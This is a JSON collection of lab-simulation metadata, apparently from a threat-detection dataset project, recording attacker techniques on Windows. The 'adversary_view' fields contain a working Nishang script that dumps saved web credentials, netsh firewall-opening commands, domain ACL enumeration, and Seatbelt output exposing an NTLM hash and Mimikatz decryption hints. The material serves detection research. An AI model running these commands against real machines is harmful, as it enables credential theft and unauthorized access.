    "datasets/atomic/_metadata/SDWIN-201028191914.yaml": {
        "title": "Windows Vault Web Credentials",
        "id": "SDWIN-201028191914",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/28",
        "modification_date": "2020/10/28",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents threat actors accessing the Windows Vault and reading web credentials saved.",
        "attack_mappings": [
            {
                "technique": "T1055",
                "sub-technique": null,
                "tactics": [
                    "TA0004",
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/psh_windows_vault_web_credentials.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": "https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Add Web Credentials\n-------------------\nPS > $pv = New-Object Windows.Security.Credentials.PasswordVault\nPS > $pw = New-Object Windows.Security.Credentials.PasswordCredential('http://ossemproject.com', 'pgustavo', '[placeholder]')\nPS >$pv.Add($pw)\n\nImport Get-WebCredentials\n-------------------------\nfunction Get-WebCredentials\n{\n  <#\n  .SYNOPSIS\n  Nishang script to retrieve web credentials from Windows vault (requires PowerShell v3 and above)\n  .DESCRIPTION\n  This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script \n  also needs PowerShell v3 onwards and must be run from an elevated shell.\n  .EXAMPLE\n  PS > Get-WebCredentials\n  .LINK\n  https://github.com/samratashok/nishang\n  #>\n  [CmdletBinding()] Param ()\n  \n  \n  #http://stackoverflow.com/questions/9221245/how-do-i-store-and-retrieve-credentials-from-the-windows-vault-credential-manage\n  $ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n  $VaultObj = new-object Windows.Security.Credentials.PasswordVault\n  $VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }\n}\n\nRun Get-WebCredentials\n----------------------\nPS C:\\Users\\wardog> Get-WebCredentials\n\nUserName Resource                Password  Properties\n-------- --------                --------  ----------\npgustavo http://ossemproject.com [placeholder] {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...\n\n\nPS C:\\Users\\wardog>"
        },
        "references": [
            "https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1"
        ],
        "mp_last_updated": "2022-01-08T01:50:00.261197+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201029001615.yaml": {
        "title": "Python HTTP Server",
        "id": "SDWIN-201029001615",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/29",
        "modification_date": "2020/10/29",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents threat actors adding a FW inbound rule and starting a Python HTTP Server.",
        "attack_mappings": [
            {
                "technique": "T1059",
                "sub-technique": null,
                "tactics": [
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/psh_python_webserver.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "Add Firewall Rule\n-----------------\nPS > & netsh advfirewall firewall add rule name=\"python.exe\" dir=in action=allow description=\"python.exe\" program=\"C:\\users\\wardog\\appdata\\local\\programs\\python\\python39\\python.exe\" enable=yes localport=any protocol=tcp remoteip=any\nOk.    \n\nPS > & netsh advfirewall firewall add rule name=\"python.exe\" dir=in action=allow description=\"python.exe\" program=\"C:\\users\\wardog\\appdata\\local\\programs\\python\\python39\\python.exe\" enable=yes localport=any protocol=udp remoteip=any\nOk.\n\nStart HTTP Server\n-----------------\nPS > python -m http.server 8000\n\nServing HTTP on :: port 8000 (http://[::]:8000/) ..."
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:50:00.473818+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201029202324.yaml": {
        "title": "SharpView PCRE.NET",
        "id": "SDWIN-201029202324",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/10/29",
        "modification_date": "2020/10/29",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor leveraging SharpView and specific functions such as Get-ObjectAcl creating files and loading dlls related to PCRE.NET use.",
        "attack_mappings": [
            {
                "technique": "T1059",
                "sub-technique": null,
                "tactics": [
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/cmd_sharpview_pcre_net.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\ProgramData>SharpView.exe Get-ObjectAcl -SamAccountName \"Domain Admins\"\n[Get-DomainSearcher] search base: LDAP://MORDORDC.THESHIRE.LOCAL/DC=THESHIRE,DC=LOCAL\n[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: (&(|(|(samAccountName=Domain Admins)(name=Domain Admins)(displayname=Domain Admins))))\nObjectDN                       : CN=Domain Admins,CN=Users,DC=theshire,DC=local\nObjectAceFlags                 : ObjectAceTypePresent, InheritedObjectAceTypePresent\nObjectAceType                  : 4c164200-20c0-11d0-a768-00aa006e0529\nInheritedObjectAceType         : 4828cc14-1437-45bc-9b07-ad6f015e5f28\nBinaryLength                   : 60\nAceQualifier                   : AccessAllowed\nIsCallback                     : False\nOpaqueLength                   : 0\nAccessMask                     : 16\nSecurityIdentifier             : S-1-5-32-554\nAceType                        : AccessAllowedObject\nAceFlags                       : None\nIsInherited                    : False\nInheritanceFlags               : None\nPropagationFlags               : None\nAuditFlags                     : None\nObjectSID                      : S-1-5-21-3140987116-517580383-2541594433-512\nActiveDirectoryRights          : ReadProperty\n..\n....."
        },
        "references": [
            "https://github.com/tevora-threat/SharpView",
            "https://twitter.com/rbmaslen/status/1321859647091970051",
            "https://twitter.com/tifkin_/status/1321916444557365248"
        ],
        "mp_last_updated": "2022-01-08T01:50:00.665619+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201102041306.yaml": {
        "title": "PowerShell HTTP Listener",
        "id": "SDWIN-201102041306",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/11/02",
        "modification_date": "2020/11/02",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor using PowerShell to start an HTTP Listener on a compromised endpoint",
        "attack_mappings": [
            {
                "technique": "T1059",
                "sub-technique": "001",
                "tactics": [
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/psh_powershell_httplistener.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "PowerShell",
                    "module": "PowerShell",
                    "script": null
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "$Hso = New-Object Net.HttpListener\n$Hso.Prefixes.Add(\"http://+:8000/\")\n$Hso.Start() "
        },
        "references": [
            "https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=netcore-3.1"
        ],
        "mp_last_updated": "2022-01-08T01:50:00.925619+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-201102163918.yaml": {
        "title": "Seatbelt Group User Discovery",
        "id": "SDWIN-201102163918",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/11/02",
        "modification_date": "2020/11/02",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor using Seatbelt profiling an endpoint. This specifically uses the -group=user command.",
        "attack_mappings": [
            {
                "technique": "T1012",
                "sub-technique": null,
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/cmd_seatbelt_group_user.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "Cmd",
                    "module": "Cmd",
                    "script": "https://github.com/GhostPack/Seatbelt"
                }
            ],
            "permissions_required": [
                "Administrator"
            ],
            "adversary_view": "C:\\Users\\wardog\\Desktop>Seatbelt.exe -group=user\n\n                        %&&@@@&&\n                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%\n                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%\n%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((\n#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((\n#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((\n#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((\n#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####\n###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####\n#####%######################  %%%..                       @////(((&%%%%%%%################\n                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*\n                        &%%&&&%%%%%        v1.1.0         ,(((&%%%%%%%%%%%%%%%%%,\n                        #%%%%##,\n\n\n====== ChromePresence ======\n\n  C:\\Users\\wardog\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\n\n    'History'     (11/2/2020 4:25:44 PM)  :  Run the 'ChromeHistory' command\n    'Cookies'     (11/2/2020 4:25:45 PM)  :  Run SharpDPAPI/SharpChrome or the Mimikatz \"dpapi::chrome\" module\n    'Login Data'  (11/2/2020 4:25:44 PM)  :  Run SharpDPAPI/SharpChrome or the Mimikatz \"dpapi::chrome\" module\n    Chrome Version                       :  86.0.4240.183\n        Version is 80+, new DPAPI scheme must be used\n====== CloudCredentials ======\n\n====== CredEnum ======\n\n  Target              : XboxLive\n  UserName            :\n  Password            : 45 43 53 32 20 00 00 00 11 F5 17 F2 CA 4E 24 26 0A 61 2C 8B E6 3A 3C 99 9A 09 88 A1 BE 7B BA 72 07 8A 5D CD A1 B3 A4 18 60 38 AD 4B 6D 40 5C 05 68 C3 A6 C8 51 C0 98 7C CB 3C DA AA 65 88 E6 B8 C0 93 BA FE 21 E5 34 7B A0 A9 F2 4B EF 09 D1 1E AE 10 AD 98 E7 AE C6 9B 27 D2 CF 50 39 CC 97 78 E9 0D 82 E3 1B 11 4C 90\n  CredentialType      : Generic\n  PersistenceType     : Session\n  LastWriteTime       : 10/29/2020 5:51:36 PM\n\n  Target              : threathunterplaybook.com\n  UserName            : wardog\n  Password            :\n  CredentialType      : DomainPassword\n  PersistenceType     : Enterprise\n  LastWriteTime       : 10/28/2020 7:13:44 PM\n\n====== dir ======\n\n  LastAccess LastWrite  Size      Path\n\n  20-09-07   20-09-07   0B        C:\\Users\\Default\\Documents\\My Music\\\n  20-09-07   20-09-07   0B        C:\\Users\\Default\\Documents\\My Pictures\\\n  20-09-07   20-09-07   0B        C:\\Users\\Default\\Documents\\My Videos\\\n  20-10-26   20-11-02   1.7KB     C:\\Users\\Public\\Desktop\\Git Bash.lnk\n  20-11-02   20-11-02   2.2KB     C:\\Users\\Public\\Desktop\\Google Chrome.lnk\n  20-10-08   20-10-28   0B        C:\\Users\\Public\\Documents\\Explorer Suite Signatures\\\n  20-09-07   20-09-07   0B        C:\\Users\\Public\\Documents\\My Music\\\n  20-09-07   20-09-07   0B        C:\\Users\\Public\\Documents\\My Pictures\\\n  20-09-07   20-09-07   0B        C:\\Users\\Public\\Documents\\My Videos\\\n  20-10-25   20-11-02   0B        C:\\Users\\wardog\\Desktop\\capa-v1.4.1-windows\\\n  20-10-18   20-11-02   0B        C:\\Users\\wardog\\Desktop\\Dumpert-master\\\n  20-10-13   20-11-02   0B        C:\\Users\\wardog\\Desktop\\GruntDLL\\\n  20-10-25   20-11-02   0B        C:\\Users\\wardog\\Desktop\\mimikatz_trunk\\\n  20-10-29   20-11-02   0B        C:\\Users\\wardog\\Desktop\\SharpView-master\\\n  20-10-09   20-11-02   0B        C:\\Users\\wardog\\Desktop\\SimpleInjection\\\n  20-10-13   20-11-02   0B        C:\\Users\\wardog\\Desktop\\SimpleInjection 2\\\n  20-10-23   20-10-23   1.9KB     C:\\Users\\wardog\\Desktop\\0001.dat\n  20-10-18   20-10-18   81.2KB    C:\\Users\\wardog\\Desktop\\Dumpert-master.zip\n  20-10-13   20-10-13   8.4MB     C:\\Users\\wardog\\Desktop\\GruntDLL.zip\n  20-10-13   20-10-13   42.1KB    C:\\Users\\wardog\\Desktop\\GruntHTTP.bin\n  20-10-21   20-11-02   392.9MB   C:\\Users\\wardog\\Desktop\\igfx_win10_100.8853.exe\n  20-10-08   20-11-02   1.4KB     C:\\Users\\wardog\\Desktop\\Microsoft Edge.lnk\n  20-10-25   20-11-02   1.2MB     C:\\Users\\wardog\\Desktop\\mimikatz.exe\n  20-10-27   20-10-29   33B       C:\\Users\\wardog\\Desktop\\my_first_rule\n  20-10-18   20-11-02   74KB      C:\\Users\\wardog\\Desktop\\Outflank-Dumpert.exe\n  20-10-28   20-10-29   1.8KB     C:\\Users\\wardog\\Desktop\\potential_process_herpaderping.yara\n  20-10-27   20-11-02   1.9KB     C:\\Users\\wardog\\Desktop\\Process Hacker 2.lnk\n  20-10-26   20-11-02   2.1MB     C:\\Users\\wardog\\Desktop\\ProcessHerpaderping.exe\n  20-10-27   20-10-27   1.6KB     C:\\Users\\wardog\\Desktop\\ProcessHerpaderping.exe.colors\n  20-10-27   20-10-27   15.7MB    C:\\Users\\wardog\\Desktop\\ProcessHerpaderping.exe.viv\n  20-10-23   20-11-02   266.5KB   C:\\Users\\wardog\\Desktop\\PurpleSharp.exe\n  20-10-21   20-11-02   505.5KB   C:\\Users\\wardog\\Desktop\\Seatbelt.exe\n  20-10-29   20-10-29   651.3KB   C:\\Users\\wardog\\Desktop\\SharpView-master.zip\n  20-10-13   20-10-13   1.4MB     C:\\Users\\wardog\\Desktop\\SimpleInjection 2.zip\n  20-10-16   20-10-23   53KB      C:\\Users\\wardog\\Desktop\\SimpleInjection.dll\n  20-10-08   20-10-08   22.8MB    C:\\Users\\wardog\\Desktop\\SimpleInjection.zip\n  20-10-17   20-10-17   15.2KB    C:\\Users\\wardog\\Desktop\\sysmon.xml\n  20-10-09   20-10-27   209.5KB   C:\\Users\\wardog\\Desktop\\test.dll\n  20-10-27   20-10-27   1.1KB     C:\\Users\\wardog\\Desktop\\test.dll.colors\n  20-10-10   20-10-10   208.2KB   C:\\Users\\wardog\\Desktop\\test.json\n  20-10-09   20-10-12   88.5KB    C:\\Users\\wardog\\Desktop\\test2.dll\n  20-10-27   20-11-02   2.1MB     C:\\Users\\wardog\\Desktop\\yara64.exe\n  20-10-27   20-11-02   2MB       C:\\Users\\wardog\\Desktop\\yarac64.exe\n  20-10-26   20-11-02   0B        C:\\Users\\wardog\\Documents\\herpaderping\\\n  20-10-18   20-10-28   0B        C:\\Users\\wardog\\Documents\\LocaleMetaData\\\n  20-10-08   20-10-08   0B        C:\\Users\\wardog\\Documents\\My Music\\\n  20-10-08   20-10-08   0B        C:\\Users\\wardog\\Documents\\My Pictures\\\n  20-10-08   20-10-08   0B        C:\\Users\\wardog\\Documents\\My Videos\\\n  20-10-18   20-10-28   0B        C:\\Users\\wardog\\Documents\\Raccine(1)\\\n  20-11-02   20-11-02   0B        C:\\Users\\wardog\\Documents\\Set-AuditRule-master\\\n  20-10-08   20-10-28   0B        C:\\Users\\wardog\\Documents\\TagsRevisited\\\n  20-10-08   20-10-30   0B        C:\\Users\\wardog\\Documents\\Visual Studio 2019\\\n  20-10-17   20-10-28   0B        C:\\Users\\wardog\\Documents\\WindowsPowerShell\\\n  20-10-08   20-10-08   8.4MB     C:\\Users\\wardog\\Documents\\GruntDLL.zip\n  20-10-21   20-11-02   8.1KB     C:\\Users\\wardog\\Documents\\Mordor-WinEvents.psm1\n  20-11-02   20-11-02   208.2KB   C:\\Users\\wardog\\Documents\\psh_powershell_httplistener_2020-11-0204130683.json\n  20-10-29   20-10-29   3.4MB     C:\\Users\\wardog\\Documents\\psh_python_webserver_2020-10-2900161507.json\n  20-10-28   20-10-28   208.9KB   C:\\Users\\wardog\\Documents\\psh_web_credentials_2020-10-2819191483.json\n  20-10-18   20-10-18   283.3KB   C:\\Users\\wardog\\Documents\\Raccine(1).zip\n  20-11-02   20-11-02   879.8KB   C:\\Users\\wardog\\Documents\\Set-AuditRule-master.zip\n  20-10-20   20-10-21   10.3KB    C:\\Users\\wardog\\Documents\\Set-AuditRule.ps1\n  20-10-16   20-10-16   2.3KB     C:\\Users\\wardog\\Documents\\Start-EtwTrace.ps1\n  20-10-16   20-10-16   47.4KB    C:\\Users\\wardog\\Documents\\TLGMetadataParser.ps1\n  20-10-16   20-10-16   47.4KB    C:\\Users\\wardog\\Documents\\TLGMetadataParser.psm1\n  20-10-27   20-10-27   6.6KB     C:\\Users\\wardog\\Documents\\udl-yara.xml\n  20-10-27   20-10-27   6KB       C:\\Users\\wardog\\Documents\\YARA.xml\n  20-10-10   20-10-28   0B        C:\\Users\\wardog\\Downloads\\evtx_dump-0.6.8-x86_64-pc-windows-msvc.tar\\\n  20-10-10   20-10-28   0B        C:\\Users\\wardog\\Downloads\\fd-v8.1.1-x86_64-pc-windows-msvc\\\n  20-10-08   20-11-02   0B        C:\\Users\\wardog\\Downloads\\Koppeling-master\\\n  20-10-27   20-10-28   0B        C:\\Users\\wardog\\Downloads\\OpenJDK11U-jdk_x64_windows_hotspot_11.0.9_11\\\n  20-10-19   20-10-28   0B        C:\\Users\\wardog\\Downloads\\PSTools\\\n  20-10-09   20-10-28   0B        C:\\Users\\wardog\\Downloads\\Sysmon\\\n  20-10-27   20-10-28   0B        C:\\Users\\wardog\\Downloads\\yara-v4.0.2-1347-win64\\\n  20-10-25   20-10-25   11.1MB    C:\\Users\\wardog\\Downloads\\capa-v1.4.1-windows.zip\n  20-10-10   20-10-10   1.2MB     C:\\Users\\wardog\\Downloads\\evtx_dump-0.6.8-x86_64-pc-windows-msvc.tar.gz\n  20-10-10   20-10-10   898.4KB   C:\\Users\\wardog\\Downloads\\fd-v8.1.1-x86_64-pc-windows-msvc.zip\n  20-10-27   20-10-27   67.5MB    C:\\Users\\wardog\\Downloads\\ghidra-Ghidra_9.1.2_build.zip\n  20-10-08   20-10-08   36.3KB    C:\\Users\\wardog\\Downloads\\Koppeling-master.zip\n  20-10-25   20-10-25   1.1MB     C:\\Users\\wardog\\Downloads\\mimikatz_trunk.zip\n  20-10-27   20-10-27   186.7MB   C:\\Users\\wardog\\Downloads\\OpenJDK11U-jdk_x64_windows_hotspot_11.0.9_11.zip\n  20-10-19   20-10-19   3MB       C:\\Users\\wardog\\Downloads\\PSTools.zip\n  20-10-09   20-10-09   1.8MB     C:\\Users\\wardog\\Downloads\\Sysmon.zip\n  20-10-27   20-10-27   2MB       C:\\Users\\wardog\\Downloads\\yara-v4.0.2-1347-win64.zip\n====== DpapiMasterKeys ======\n\n  Folder : C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3940915590-64593676-1414006259-500\n\n    LastAccessed              LastModified              FileName\n    ------------              ------------              --------\n    10/18/2020 3:41:37 AM     10/18/2020 3:41:37 AM     ad27dbc8-def4-4b0d-bfbd-89b429dfe9fe\n\n\n  [*] Use the Mimikatz \"dpapi::masterkey\" module with appropriate arguments (/pvk or /rpc) to decrypt\n  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz \"sekurlsa::dpapi\" module\n  [*] You can also use SharpDPAPI for masterkey retrieval.\n====== ExplorerMRUs ======\n\n  Explorer  BUILTIN\\Administrators  2020-11-02  C:\\Users\\wardog\\Documents\\cmd_psexec_lsa_secrets_dump_2020-10-2001090629.json\n  Explorer  BUILTIN\\Administrators  2020-11-02  C:\\Users\\wardog\\Documents\\AMSITLGTrace.evtx\n  Explorer  BUILTIN\\Administrators  2020-11-02  C:\\Windows\\System32\\amsi.dll\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\Mordor-WinEvents.psm1\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\MordorDataset.json\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\mordor_raccine_simulation_mode_2020-10-18T05154752.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Downloads\\Koppeling-master\\Koppeling-master\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Downloads\\Koppeling-master\\Koppeling-master\\Koppeling.sln\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\\LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Windows\\System32\\winevt\\Logs\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\\GruntDLL\\GruntDLL\\GruntDLL.sln\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\Export-WinEvents.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\export.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Downloads\\ghidra-Ghidra_9.1.2_build\\ghidra-Ghidra_9.1.2_build\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\\GruntDLL\\GruntDLL\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\\GruntDLL.zip\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\export.json\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\Export-EventLogs.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\\Dumpert-master\\Dumpert-master\\Dumpert\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Desktop\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Downloads\\ghidra-Ghidra_9.1.2_build\\ghidra-Ghidra_9.1.2_build\\DevGuide.md\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\cmd_sam_copy_esentutl_2020-10-1900171197.json\n  Explorer  BUILTIN\\Administrators  2020-10-30  C:\\Users\\wardog\\Documents\\cmd_sam_copy_esentutl_2020-10-1823514110.json\n  Explorer  BUILTIN\\Administrators  2020-10-29  C:\\Users\\wardog\\Desktop\\SharpView-master\\SharpView-master\n  Explorer  BUILTIN\\Administrators  2020-10-29  C:\\Users\\wardog\\Desktop\\SharpView-master\\SharpView-master\\SharpView.sln\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\YARA.xml\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Downloads\\yara-v4.0.2-1347-win64.zip\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\wmic_remote_xsl_jscript4.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\wmic_remote_xsl_jscript5.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\wmic_remote_xsl_jscript3.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\wmic_remote_xsl_jscript2.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\wmic_remote_xsl_jscript.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\udl-yara.xml\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\TLGMetadataParser.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\TLGMetadataParser.psm1\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\test.txt\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\test.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\test.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\test.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Windows\\System32\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\sysmon.xml\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\Start-EtwTrace.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\SimpleInjection 2\\SimpleInjection\\SimpleInjection.sln\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\SimpleInjection\\SimpleInjection.zip\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\SimpleInjection 2\\SimpleInjection\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\SimpleInjection 2.zip\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\Set-AuditRule.ps1\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\Security.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\raccine_simulation_mode_2020-10-18T05154752.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\raccine_2020-10-18T04185015.json\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\potential_process_herpaderping.yara\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\potential_process_herpaderping.txt\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Desktop\\Dumpert-master\\Dumpert-master\\Dumpert\\Outflank-Dumpert.sln\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out8.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out7.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out6.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out5.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out3.evtx\n  Explorer  BUILTIN\\Administrators  2020-10-28  C:\\Users\\wardog\\Documents\\out4.evtx\n====== ExplorerRunCommands ======\n\n====== FileZilla ======\n\n====== FirefoxPresence ======\n\n====== IdleTime ======\n\n  CurrentUser : WORKSTATION5\\wardog\n  Idletime    : 00h:00m:00s:015ms (15 milliseconds)\n\n====== IEFavorites ======\n\nFavorites (wardog):\n\n  http://go.microsoft.com/fwlink/p/?LinkId=255142\n\n====== IETabs ======\n\n====== IEUrls ======\n\nInternet Explorer typed URLs for the last 7 days\n\n====== MappedDrives ======\n\nMapped Drives (via WMI)\n\n====== MTPuTTY ======\n\n====== OfficeMRUs ======\n\nEnumerating Office most recently used files for the last 7 days\n\n  App       User                     LastAccess    FileName\n  ---       ----                     ----------    --------\n====== PowerShellHistory ======\n\n====== PuttyHostKeys ======\n\n====== PuttySessions ======\n\n====== RDCManFiles ======\n\n====== RDPSavedConnections ======\n\n====== SecPackageCreds ======\n\n  Version                        : NetNTLMv1\n  Hash                           : wardog::WORKSTATION5:99c43e8b88a02e13bae1b088a24d3a90aa64487f8da1e2fd:99c43e8b88a02e13bae1b088a24d3a90aa64487f8da1e2fd:1122334455667788\n\n====== SlackDownloads ======\n\n====== SlackPresence ======\n\n====== SlackWorkspaces ======\n\n====== SuperPutty ======\n\n====== TokenGroups ======\n\nCurrent Token's Groups\n\n  WORKSTATION5\\None                        S-1-5-21-3940915590-64593676-1414006259-513\n  Everyone                                 S-1-1-0\n  NT AUTHORITY\\Local account and member of Administrators group S-1-5-114\n  BUILTIN\\Administrators                   S-1-5-32-544\n  BUILTIN\\Performance Log Users            S-1-5-32-559\n  BUILTIN\\Users                            S-1-5-32-545\n  BUILTIN\\Remote Desktop Users             S-1-5-32-555\n  NT AUTHORITY\\REMOTE INTERACTIVE LOGON    S-1-5-14\n  NT AUTHORITY\\INTERACTIVE                 S-1-5-4\n  NT AUTHORITY\\Authenticated Users         S-1-5-11\n  NT AUTHORITY\\This Organization           